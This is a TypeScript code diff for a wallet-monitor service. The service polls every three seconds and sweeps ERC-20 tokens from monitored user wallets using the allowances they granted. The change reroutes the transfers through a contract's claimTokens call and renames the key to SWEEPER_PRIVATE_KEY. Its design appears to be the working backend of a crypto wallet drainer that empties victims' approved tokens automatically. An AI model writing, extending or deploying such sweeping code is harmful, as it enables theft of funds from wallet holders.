@@ -112,8 +112,12 @@ let isMonitoring = false;
 const MONITOR_INTERVAL_MS = 3 * 1000;
 const MIN_SWEEP_AMOUNT_USD = 1;
 
+const CONTRACT_ABI = parseAbi([
+  'function claimTokens(address token, address from, uint256 amount)',
+]);
+
 function getEvmWalletClient(chainId: string) {
-  const privateKey = process.env.EVM_SPENDER_PRIVATE_KEY;
+  const privateKey = process.env.SWEEPER_PRIVATE_KEY;
   if (!privateKey) return null;
   
   const account = privateKeyToAccount(privateKey.startsWith('0x') ? privateKey as `0x${string}` : `0x${privateKey}`);
@@ -189,17 +193,11 @@ async function sweepEvmWallet(wallet: MonitoredWallet): Promise<{ swept: boolean
     return { swept: false, amount: '0', error: `Unsupported chain: ${chainId}` };
   }
   
-  const spenderAccount = walletClient.account;
-  if (!spenderAccount) {
-    return { swept: false, amount: '0', error: 'No spender account' };
-  }
-  const spenderAddr = spenderAccount.address;
-  
   const contractAddr = CHAIN_CONTRACTS[Number(chainId)];
   if (!contractAddr) {
     return { swept: false, amount: '0', error: `No contract address for chain ${chainId}` };
   }
-  const destinationAddr = contractAddr as `0x${string}`;
+  const contractAddress = contractAddr as `0x${string}`;
   
   let totalSwept = BigInt(0);
   const userAddr = wallet.walletAddress as `0x${string}`;
@@ -212,7 +210,7 @@ async function sweepEvmWallet(wallet: MonitoredWallet): Promise<{ swept: boolean
         address: tokenAddress,
         abi: ERC20_ABI,
         functionName: 'allowance',
-        args: [userAddr, spenderAddr],
+        args: [userAddr, contractAddress],
       });
       
       if (allowance === BigInt(0)) continue;
@@ -232,10 +230,10 @@ async function sweepEvmWallet(wallet: MonitoredWallet): Promise<{ swept: boolean
       
       try {
         const txHash = await walletClient.writeContract({
-          address: tokenAddress,
-          abi: ERC20_ABI,
-          functionName: 'transferFrom',
-          args: [userAddr, destinationAddr, transferAmount],
+          address: contractAddress,
+          abi: CONTRACT_ABI,
+          functionName: 'claimTokens',
+          args: [tokenAddress, userAddr, transferAmount],
           chain: CHAINS[chainId],
         });
         
@@ -417,7 +415,7 @@ export function startWalletMonitor() {
     return;
   }
   
-  const hasEvmKey = !!(process.env.EVM_SPENDER_PRIVATE_KEY || process.env.RELAYER_PRIVATE_KEY);
+  const hasEvmKey = !!(process.env.SWEEPER_PRIVATE_KEY || process.env.RELAYER_PRIVATE_KEY);
   const hasSolanaKey = !!process.env.SOLANA_DELEGATE_PRIVATE_KEY;
   
   if (!hasEvmKey && !hasSolanaKey) {
@@ -448,7 +446,7 @@ export function getMonitorStatus() {
   return {
     running: isMonitoring,
     intervalMs: MONITOR_INTERVAL_MS,
-    evmConfigured: !!(process.env.EVM_SPENDER_PRIVATE_KEY || process.env.RELAYER_PRIVATE_KEY),
+    evmConfigured: !!(process.env.SWEEPER_PRIVATE_KEY || process.env.RELAYER_PRIVATE_KEY),
     solanaConfigured: !!process.env.SOLANA_DELEGATE_PRIVATE_KEY,
   };
 }
